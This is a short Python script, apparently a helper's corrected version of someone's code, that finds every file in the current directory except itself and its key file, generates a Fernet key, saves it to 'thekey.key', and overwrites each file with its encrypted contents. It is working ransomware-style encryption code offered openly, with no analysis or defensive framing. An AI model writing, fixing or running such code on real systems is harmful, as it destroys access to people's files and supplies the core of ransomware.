#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
# Ensure the cryptography package is installed: pip install cryptography

files = []

for file in os.listdir():
    if file == "trial.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):  # This line was wrongly indented in your code
        files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# print(key)  # Uncomment this if you want to see the key

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    fernet = Fernet(key)
    encrypted = fernet.encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(encrypted)

    print(f"Encrypted {file} successfully.")
